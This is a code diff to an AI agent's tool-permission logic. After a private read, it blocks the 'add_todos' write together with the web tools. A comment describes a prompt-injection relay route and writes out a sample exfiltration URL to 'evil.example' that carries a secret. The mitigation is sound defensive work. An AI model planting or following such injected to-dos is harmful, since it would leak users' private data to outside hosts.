@@ -39,11 +39,16 @@ export const PRIVATE_READERS: ReadonlySet<string> = new Set([
   'search_drive', 'read_drive_file', 'get_morning_briefing',
 ]);
 
+// Writes whose text is later acted on by another runner that HAS web tools: a to-do added here is worked by the
+// to-do runner, which opens URLs found in its text. After a private read, injected text could plant a to-do like
+// "open https://evil.example/?d=<secret>", so these go away together with the web tools.
+export const RELAY_WRITES: ReadonlySet<string> = new Set(['add_todos']);
+
 export function allowedTools(privateRead: boolean): Set<string> {
   const out = new Set<string>();
   for (const [name, tier] of Object.entries(AGENT_TOOL_TIER)) {
     if (tier === 'never') continue;
-    if (privateRead && WEB_TOOLS.has(name)) continue;
+    if (privateRead && (WEB_TOOLS.has(name) || RELAY_WRITES.has(name))) continue;
     out.add(name);
   }
   return out;
